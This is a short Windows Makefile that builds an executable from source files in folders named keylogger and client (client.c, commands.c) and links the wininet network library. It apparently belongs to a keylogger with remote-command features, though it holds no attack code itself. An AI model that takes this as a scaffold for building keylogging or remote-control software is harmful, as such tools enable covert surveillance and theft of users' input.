
CC = gcc # Compiler

CFLAGS = -Wall # compiler flags

TARGET = run # output executable name

# source files
SRCS = \
	src\main.c\
	\
	src\program\program.c\
	src\program\utils.c\
	\
	src\keylogger\keylogger.c\
	src\keylogger\keypair.c\
	\
	src\client\client.c\
	src\client\commands.c

# build target
$(TARGET): $(SRCS)
	$(CC) $(CFLAGS) -o $(TARGET) $(SRCS) -lwininet

clean:
	del .\$(TARGET).exe

	